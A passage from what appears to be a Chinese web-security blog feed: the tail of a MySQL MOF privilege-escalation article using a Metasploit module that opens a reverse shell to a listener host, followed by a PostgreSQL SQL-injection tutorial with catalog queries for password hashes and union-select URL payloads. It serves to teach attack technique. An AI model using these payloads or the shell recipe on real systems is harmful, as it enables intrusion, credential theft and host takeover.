&#x27;C:\\WINDOWS\\system32\\wbem\\mof\\user.mof&#x27;;</span><br></pre></td></tr></table></figure>
<h4 id="利用MSF自动化提权"><a href="#利用MSF自动化提权" class="headerlink" title="利用MSF自动化提权"></a>利用MSF自动化提权</h4><p>可以利用<code>msf</code>的<code>exploit/windows/mysql/mysql_mof</code>模块进行自动化提权，命令如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="meta">#</span><span class="bash"> mysql账号密码</span></span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line"><span class="meta">#</span><span class="bash"> 目标主机ip和端口</span></span><br><span class="line">set rhost 192.168.26.174</span><br><span class="line">set rport 3306</span><br><span class="line"><span class="meta">#</span><span class="bash"> 接收shell的ip和端口</span></span><br><span class="line">set lhost 192.168.26.129</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>返回的是system权限</p>
<p><img src="https://i.loli.net/2021/10/05/Cxykrgh2HWib3qQ.png" alt="img"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>《Web入侵先遣—SQL注入攻击技术初探 》</li>
<li>吴翰清 著《白帽子讲Web安全》</li>
<li><a href="https://blog.csdn.net/weixin_44925883/article/details/116324005">二次注入 &amp; Sqli-labs Less 24_信安小菜鸡的博客-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/qq_28786023/article/details/108820124">SQL注入（宽字节注入、长字符截断）_ustcsse2019-lee的博客-CSDN博客_sql注入截断</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/12767050.html">MySQL注入点写入WebShell的几种方式 - Bypass - 博客园 (cnblogs.com)</a></li>
<li><a href="https://www.cnblogs.com/renhaoblog/p/12912452.html">利用DNS实现SQL注入带外查询（OOB） - renblog - 博客园 (cnblogs.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/33727367">Dnslog在SQL注入中的实战 - 知乎 (zhihu.com)</a></li>
<li><a href="https://www.sqlsec.com/2020/11/mysql.html">MySQL 漏洞利用与提权 | 国光 (sqlsec.com)</a></li>
<li><a href="https://www.cnblogs.com/AirSky/p/Mysql_UDF_PROMOTION_PRIVILEGE.html">Mysql UDF提权方法 - AirSkys - 博客园 (cnblogs.com)</a></li>
<li><a href="https://www.cnblogs.com/zzjdbk/p/12991468.html">MySQL提权之mof提权 - My_Dreams - 博客园 (cnblogs.com)</a></li>
<li><a href="https://www.alienchen.cn/45.html">MySQL提权之MOF - A’s Wor1d (alienchen.cn)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL数据库注入攻击方式</title>
    <url>/post/1853c6b8.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="PostgreSQL数据库的基本知识"><a href="#PostgreSQL数据库的基本知识" class="headerlink" title="PostgreSQL数据库的基本知识"></a>PostgreSQL数据库的基本知识</h2><h3 id="PostgreSQL数据库介绍"><a href="#PostgreSQL数据库介绍" class="headerlink" title="PostgreSQL数据库介绍"></a>PostgreSQL数据库介绍</h3><p>PostgreSQL 是一个免费的对象-关系数据库服务器 (ORDBMS)，在灵活的 BSD 许可证下发行。PostgreSQL 的 Slogan 是 “世界上最先进的开源关系型数据库”。PostgerSQL也简称Postgres。</p>
<p>Postgres在国内并不常见，但在国外的流行程度却不亚于MySQL。</p>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>Postgres的基本语法与MySQL类似，如果对手工注入或SQL语法有较多了解不会有任何困难。</p>
<h4 id="堆叠查询与代码块"><a href="#堆叠查询与代码块" class="headerlink" title="堆叠查询与代码块"></a>堆叠查询与代码块</h4><ul>
<li><p>Postgres 支持多行查询,语句间的分隔符为分号<code>;</code>，同时也只有分号是合法的分隔符。</p>
</li>
<li><p>如果多行执行的语句中有超过一个语句会返回结果集，在命令行或者C#查询会执行前一个，在PHP中查询会执行后一个（虽然我也不知道是什么原理，但查询结果就是这样~）。</p>
</li>
<li><p>Postgres 支持以 begin;开始，以 end;结束的代码块,但代码块内执行的语句不会有任何返回结果。同时如果代码块之前一条语句会返回结果，则先前语句返回的结果集会被覆盖(即不返回任何结果)。</p>
</li>
<li><p>Postgres 支持以 begin;开始，以 end;结束的代码块,但代码块内执行的语句不会有任何返回结果。同时如果代码块之前一条语句会返回结果，则先前语句返回的结果集会被覆盖(即不返回任何结果)。</p>
<p>例如:执行查询语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">begin</span>;<span class="keyword">select</span> <span class="number">2</span>;<span class="keyword">end</span>;</span><br><span class="line"># 不会返回任何结果集(在PHP查询中)</span><br><span class="line"><span class="keyword">begin</span>;<span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">end</span>;<span class="keyword">select</span> <span class="number">2</span>;</span><br><span class="line"># 返回<span class="number">2</span>(在PHP查询中)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="Limit"><a href="#Limit" class="headerlink" title="Limit"></a>Limit</h4><p>在 postgres 中，limit 的语法为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> [field list] <span class="keyword">from</span> [<span class="keyword">table</span>] limit count <span class="keyword">offset</span> <span class="keyword">start</span>;</span><br></pre></td></tr></table></figure>
<p>其中 start 为起始位置(以 0 开始),count 为总数。</p>
<h4 id="Unknown类型"><a href="#Unknown类型" class="headerlink" title="Unknown类型"></a>Unknown类型</h4><p>Postgres 输入的所有字符串都被认为是 Unknown 类型。也就是输入本身是未定义类型，由数据库根据操作进行匹配转换,如果匹配失败则报错。</p>
<p>Unknown 类型有两种输入模式：<strong>单引号转义模式</strong>与<strong>美元符逃逸模式</strong>。</p>
<h5 id="单引号转义模式"><a href="#单引号转义模式" class="headerlink" title="单引号转义模式"></a>单引号转义模式</h5><p>在单引号转义模式中允许使用前缀 `<span style="color: red;">E</span>/<span style="color: blue;">U&amp;</span>/<span style="color: green;">B/X</span> 表示<span style="color: red;">转义字符串</span>/<span style="color: blue;">Unicode 字符串</span>/<span style="color: green;">位串</span>，其中 <span style="color: red;">E 表示进行 c 语言风格的转义</span>，<span style="color: blue;">U 表示进行 Unicode 转义，并支持自定义转义符</span>,<span style="color: green;">B 和 X 代表后续跟随的是一个 bit 序列</span>。例如以下查询都将返回制表符(0x09):</p>
<p>例如以下查询都将返回制表符(0x09)：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> E<span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> E<span class="string">&#x27;\011&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> E<span class="string">&#x27;\x09&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> E<span class="string">&#x27;\u0009&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span><span class="string">&#x27;\0009&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span><span class="string">&#x27;!0009&#x27;</span> <span class="keyword">uescape</span> <span class="string">&#x27;!&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>以 U&amp;为前缀、双引号包含的字符串会作为表名、字段名与函数名等关键字使用。例如:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span>&quot;\0061&quot; <span class="keyword">from</span> test;		 					<span class="comment">--等同于 select a from test</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> U<span class="operator">&amp;</span>&quot;!0074est&quot; <span class="keyword">uescape</span> <span class="string">&#x27;!&#x27;</span>;		 		<span class="comment">--等同于 select a from test</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span>&quot;!0063hr&quot; <span class="keyword">uescape</span> <span class="string">&#x27;!&#x27;</span> (<span class="number">97</span>);				<span class="comment">--返回 a,等同于 select chr(97)</span></span><br></pre></td></tr></table></figure>
<p>B 和 X 会将其后跟随的字符串转换为 bit 序列(即二进制数)，例如以下查询都将返回 bit 值 01010101(如果是在 php 或查询分析器中查询，则返回字符串 01010101)：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> B<span class="string">&#x27;01010101&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> X<span class="string">&#x27;55&#x27;</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：在 postgres 中由一个名为 <code>standard_conforming_strings</code> 的变量控制在没有任何前缀时是否自动进行 c 语言风格的转义。这个变量是一个 text 型的字符串，如果值为 on，则表示只有以 postgres 风格显式声明转义前缀的字符串会进行转义，如果不加前缀的话，则不会进行任何转义(除了两个单引号会被转 换为单引号之外)；如果值为 off，则表示没有任何前缀的字符串将自动进行 c 语言风格转义。这个值在 9.1之前的版本为 off，而在 9.1 及之后的版本为 on。</p>
<p>例如，在 <code>standard_conforming_strings</code> 为 on 时,以下查询会成功执行并返回反斜杠:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;\&#x27;;</span><br></pre></td></tr></table></figure>
<p>而在为 off 时,则会出现“未结束的引号字串”的错误信息。</p>
</blockquote>
<h5 id="美元符号逃逸模式"><a href="#美元符号逃逸模式" class="headerlink" title="美元符号逃逸模式"></a>美元符号逃逸模式</h5><p>美元符逃逸模式是 postgres 专有的字符串声明格式，其目的是为了避免由于字符串中包含大量的反斜杠或单引号而进行的转义，其构成方式由一个美元符号<code>$</code>，一个可选的零个或多个字符“记号”，另外一个美元符号，一个组成字串常量的任意字符的序列，一个美元符号，以及一个和开始这个美元符包围的记号相同的记号，和一个美元符号组成。例如以下查询均返回单引号：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> $$<span class="string">&#x27;$$;</span></span><br><span class="line"><span class="string">select $tag$&#x27;</span>$tag$;</span><br></pre></td></tr></table></figure>
<p>在美元符逃逸模式中没有任何字符串需要转义，也没有任何字符串会被转义，转义字符与前缀均不可用。唯一要注意的是被转义字符中不能出现与包围这些字符串的记号相同的字符串，例如上例中第二个语句中的字符绝不能出现<script type="math/tex">tag</script>，否则会在出现<script type="math/tex">tag</script>的地方截断，同时将之后的字符串作为查询的别名。如果查询的别名也由<script type="math/tex">....</script>开始，同时没有匹配的结束标记，则会返回一个错误。</p>
<p>例如以下查询返回单引号，同时将指定别名 <code>test$tag$</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> $tag$<span class="string">&#x27;$tag$test$tag$;</span></span><br></pre></td></tr></table></figure>
<p>而以下语句会返回“未结束的$符号引用的字符串”的错误信息：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> $tag$<span class="string">&#x27;$tag$$test$tag$;</span></span><br></pre></td></tr></table></figure>
<h4 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h4><p>Postgres 支持两种数据类型转换方式：使用 <code>cast</code> 语句或<code>::</code>运算符。</p>
<p>cast 语句的语法为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cast</span>([field<span class="operator">/</span><span class="keyword">value</span>] <span class="keyword">as</span> type)</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">cast</span>( <span class="string">&#x27;1&#x27;</span> <span class="keyword">as</span> <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line"># 返回数字 <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><code>::</code>运算符用于值或字段之后，效果同<code>cast</code>，但在语法上简便许多，在需要进行多次转换进行报错的时候无疑是很方便的。</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span>::text::<span class="type">int</span>;</span><br><span class="line"></span><br><span class="line"># 返回数字 <span class="number">1</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：在 Postgres 中,转换会先判断类型,某些类型之间是不能互相转换的(例如 bytea 和 int)，但几乎所有的类型都可以转换为 text。这样通过转为 text 再转为 int 的双次类型转换报错在注入中相当有用。</p>
</blockquote>
<h3 id="Schema与目录对象"><a href="#Schema与目录对象" class="headerlink" title="Schema与目录对象"></a>Schema与目录对象</h3><p>关系型数据库一般都有着存放库、表、字段之间对应关系的表(或视图)，postgres也不例外。</p>
<p>所不同的是 postgres 多出一个 Schema 对象,这也是 postgres 与其他数据库最大的几个不同点之一。</p>
<h4 id="什么是-Schema？"><a href="#什么是-Schema？" class="headerlink" title="什么是 Schema？"></a>什么是 Schema？</h4><p><code>Schema</code> 是 Postgres 中的一个特殊对象，<code>Schema</code> 可以看作一个数据库中单独分割出的独立的数据库系统。利用 <code>Schema</code> 可以进行权限划分或水平的功能分割操作。</p>
<p>由于 Postgres 认为数据库是一个独立的个体，所以跨库操作是不允许的。但 <code>Schema</code> 属于数据库本身的一部分，所以跨 Schema 读取数据是完全可行的(前提是需要拥有读取的权限)。</p>
<p>跨 Schema 读取数据有两种方式，第一种是类似于 mysql 跨库查询的语句，例如执行查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Manager.admin;</span><br><span class="line"></span><br><span class="line"># 返回 Manager Schema 中表 admin 的内容。</span><br></pre></td></tr></table></figure>
<p>或者使用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> search_path <span class="keyword">to</span> [Schema Name];</span><br></pre></td></tr></table></figure>
<p>修改查询路径。</p>
<p>例如执行：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> search_path <span class="keyword">to</span> manager;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin;</span><br><span class="line"></span><br><span class="line">#也将返回 Manager Schema 中表 admin 的内容。</span><br></pre></td></tr></table></figure>
<p>注意：这条语句在注入中不会起到任何作用。</p>
<p>另：默认使用的 <code>Schema</code> 名称为 <code>public</code>，这是 postgres 建立一个数据库时自动生成的 <code>Schema</code>。</p>
<p>Postgres 中有一种名为目录的特殊的 <code>Schema</code>，它由系统在建立数据库时生成。目录所包含的对象叫目录对象，可以理解为 <code>Schema</code> 中的表；目录对象中包含字段。</p>
<p>默认情况下会生成两个目录：<code>pg_catalog</code> 和 <code>information_schema</code>。<code>pg_catalog</code> 中存放当前数据库的对象，例如系统函数、默认视图、大对象等。</p>
<p><code>information_schema</code> 存放的则是当前数据库的架构信息。</p>
<h4 id="通过-pg-catalog-获取数据库关键信息"><a href="#通过-pg-catalog-获取数据库关键信息" class="headerlink" title="通过 pg_catalog 获取数据库关键信息"></a>通过 pg_catalog 获取数据库关键信息</h4><h5 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h5><p>所有的数据库名称存放于 <code>pg_database</code> 目录对象的 <code>datname</code> 字段中,这个目录对象与字段任何用户均可读取。</p>
<p>例如：以下语句会返回所有的数据库名称。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> datname <span class="keyword">from</span> pg_database;</span><br></pre></td></tr></table></figure>
<p>注意：名称以 <code>template</code> 开头的数据库为 postgres 自动生成的临时数据库,不需要理会。</p>
<h5 id="获取数据库文件信息"><a href="#获取数据库文件信息" class="headerlink" title="获取数据库文件信息"></a>获取数据库文件信息</h5><p>数据库的配置信息储存于 <code>pg_settings</code> 目录对象中，其中 <code>name</code> 字段为设置选项的名称，<code>setting</code> 字段为选项的值。</p>
<p>这些配置信息中最为重要的便是几个目录信息：数据库文件目录(<code>data_directory</code>)与数据库认证配置文件路径(<code>hba_file</code>)，不过只有在 super 权限下才能进行读取。</p>
<p>例如，使用以下语句会返回以上两个目录信息(需要 super 权限)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name,setting <span class="keyword">from</span> pg_settings <span class="keyword">where</span> name <span class="keyword">in</span> (<span class="string">&#x27;hba_file&#x27;</span>,<span class="string">&#x27;data_directory&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h5 id="获取数据库用户信息"><a href="#获取数据库用户信息" class="headerlink" title="获取数据库用户信息"></a>获取数据库用户信息</h5><p>数据库的用户信息存放于 <code>pg_authid</code> 目录对象中，只有在 super 权限下才能进行读取(super 可以看作是 mssql 中的 sysadmin，是 postgres 中最高的权限组；无论何时，postgres 用户总拥有最高的权限)。这个目录对象记录了所有的用户信息，最为重要的是用户名及加密后的密码。其中用户名储存于 <code>rolname</code> 字段,密码储存于 <code>rolpassword</code> 字段。</p>
<p>使用以下语句可以查询出数据库所有的用户与加密后的密码：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> rolname,rolpassword <span class="keyword">from</span> pg_authid;</span><br></pre></td></tr></table></figure>
<p>注：postgres 密码加密方式为 ‘md5’+md5（密码+用户名）</p>
<p><code>pg_user</code> 是一个视图，其中映射了 <code>pg_shadow</code> 视图(这个视图映射了 <code>pg_authid</code> 的部分字段)的内容。除了密码被替换为一串星号,其余的数据完全相同。</p>
<p>事实上我们只需要关心这个视图内的一个字段：usesuper，这个字段为一个布尔值，表明是否为 super用户。</p>
<p>例如，使用以下语句即可判断当前用户是否具有 super 权限:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> usesuper <span class="keyword">from</span> pg_user <span class="keyword">where</span> usename<span class="operator">=</span><span class="built_in">current_user</span>;</span><br></pre></td></tr></table></figure>
<h4 id="通过-information-schema-获取数据库架构信息"><a href="#通过-information-schema-获取数据库架构信息" class="headerlink" title="通过 information_schema 获取数据库架构信息"></a>通过 information_schema 获取数据库架构信息</h4><p>和 mysql 类似，postgres 中也有储存数据库表段与字段的 <code>information_schema</code> 对象，所不同的是 mysql中的 <code>information_schema</code> 是独立的数据库，而在 postgres 中为在数据库中共享的目录对象。</p>
<p>information_schema 目录存放了当前数据库全部的架构信息，例如全部的表名，表中全部的字段，字段之间的关系等等。在注入利用中，最需要关心的只有三点:所有的 Schema、所有的表与其所属的 Schema、所有的字段与其所属的表。</p>
<p>所有的 Schema 信息存放于 <code>schemata</code> 目录对象中，<code>schema_name</code> 字段存放的就是 Schema 的名称(可以看到 <code>information_schema</code> 也在其中)。不过很遗憾，非 super 权限不能从这个目录对象中读取到任何内容。</p>
<p>所有的表名存放于 tables 目录对象中，所有的字段名存放于 columns 目录对象中，这两个表在非 super用户下也可以进行读取操作。</p>
<p>这两个表均包含 <code>table_schema</code> 字段，用以表示所属的 Schema。这样利用以下语句即可<strong>获取完整的Schema 信息</strong>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>所有表信息则存放于 tables 目录对象的 <code>table_name</code> 字段中,使用以下语句即可查询出<strong>所有的用户表</strong>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>所有字段信息则存放于 columns 目录对象的 <code>column_name</code> 字段中，同时由 <code>table_name</code> 字段记录对应的表名。使用以下语句即可查询出所属于 <code>Manager.admin</code> 的<strong>所有字段</strong>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;manager&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="常用SQL语句总结"><a href="#常用SQL语句总结" class="headerlink" title="常用SQL语句总结"></a>常用SQL语句总结</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 获取安装目录下的文件</span><br><span class="line"><span class="keyword">select</span> pg_ls_dir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># 获取数据库的IP地址</span><br><span class="line"><span class="keyword">select</span> inet_server_addr();</span><br><span class="line"></span><br><span class="line"># 获取当前数据库用户名</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">CURRENT_USER</span>;</span><br><span class="line"></span><br><span class="line"># 显示当前用户及是否为Super权限</span><br><span class="line"><span class="keyword">select</span> concat_ws(<span class="string">&#x27;:&#x27;</span>,usename,usesuper::text) <span class="keyword">from</span> pg_user <span class="keyword">where</span> usename<span class="operator">=</span><span class="built_in">current_user</span>;</span><br><span class="line"></span><br><span class="line"># 获取数据库版本</span><br><span class="line"><span class="keyword">select</span> version();</span><br><span class="line"></span><br><span class="line"># 获取当前数据库</span><br><span class="line"><span class="keyword">select</span> current_database();</span><br><span class="line"></span><br><span class="line"># 获取所有数据库</span><br><span class="line"><span class="keyword">select</span> datname <span class="keyword">from</span> pg_database;</span><br><span class="line"></span><br><span class="line"># 获取当前schema</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">CURRENT_SCHEMA</span>;</span><br><span class="line"></span><br><span class="line">#获取当前数据库的所有schema</span><br><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"># 获取所有表名</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"># 获取所有字段名</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;manager&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 获取数据</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">array</span>(<span class="keyword">select</span> <span class="type">row</span>(username,password) <span class="keyword">from</span> &quot;Users&quot;);</span><br><span class="line"></span><br><span class="line"># 显示所有 Schema、表、字段并按照对应关系进行排列(仅用于多行执行可用的情况下)</span><br><span class="line"><span class="keyword">with</span> a <span class="keyword">as</span> (<span class="keyword">select</span> table_name tname,<span class="built_in">array_agg</span>(column_name::text)cname,<span class="built_in">array_agg</span>(table_schema::text)sname <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>),b <span class="keyword">as</span>(<span class="keyword">select</span> <span class="built_in">unnest</span>(sname)sname,tname,<span class="built_in">unnest</span>(cname)cname <span class="keyword">from</span> a <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>)<span class="keyword">select</span> <span class="keyword">array</span>(<span class="keyword">select</span> <span class="type">row</span>(sname,tname,cname)::text <span class="keyword">from</span> b);</span><br><span class="line"></span><br><span class="line"># 显示所有 Schema、表、字段并按照对应关系进行排列(任意情况均可用)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">array</span>(<span class="keyword">select</span> <span class="type">row</span>(sname,tname,cname)::text <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">unnest</span>(sname)sname,tname,<span class="built_in">unnest</span>(cname)cname <span class="keyword">from</span> (<span class="keyword">select</span> table_name tname,<span class="built_in">array_agg</span>(column_name::text)cname,<span class="built_in">array_agg</span>(table_schema::text)sname <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span> )a <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>)b);</span><br></pre></td></tr></table></figure>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>联合注入的特点是数据库通过执行 Union Select 语句返回的结果集中有一行或多行会被 web 应用程序处理并返回结果，也是最常见最常用的注入方式。</p>
<p>联合注入根据显示方式可以分为 Union-Select、Union-List、Union-Image、Union-Download 四种，其中由于前两种极为常见这里一笔带过,重点对Union-Image和Union-Download 两种较为少见的注入点体现进行讲解。</p>
<p>Postgres 在进行联合查询操作时对<strong>数据类型是敏感的</strong>,如果类型不匹配的话，则会返回“Union类型的类型 XXX 与 XXXX 不匹配”的错误。由于 Unknown 类型可以转换为绝大多数类型，所以可以使用’1’,’2’,’3’……代替1,2,3,从而实现自动匹配。</p>
<blockquote>
<p>注：不建议用 null 进行匹配，因为有时可能会因此导致缺少一个甚至多个重要的输出位置,用单引号或美元符引起的字符串作为替代是最好不过的做法了。</p>
<p>联合注入常用函数：</p>
<ul>
<li>concat() &amp; concat_ws()：在查询多个字段时,可以使用 <code>concat_ws()</code> 或 <code>concat()</code> 函数将多个字段的结果聚合到一起。这两个函数在使用上与 mysql 与之同名的两个函数没有任何不同。</li>
<li>row()：当需要将某一行中几个字段聚合到一起时，可以使用 <code>row()</code>函数。</li>
<li>array_agg()：在需要将某个字段的值聚合到一行时，可以使用 <code>array_agg()</code> 函数。</li>
<li>array()：当需要把某个查询的结果集作为一行输出时,可以使用 <code>array()</code> 函数。</li>
</ul>
</blockquote>
<h3 id="Union-Select注入"><a href="#Union-Select注入" class="headerlink" title="Union-Select注入"></a>Union-Select注入</h3><p>payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 获取当前数据库</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> current_database()),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 获取当前schema</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="built_in">CURRENT_SCHEMA</span>),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 获取schema为public的第<span class="number">1</span>张表名</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 获取schema为public的第<span class="number">2</span>张表名</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 获取public.Users的第<span class="number">1</span>个字段名</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;Users&#x27;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 获取public.Users的第<span class="number">2</span>个字段名</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span 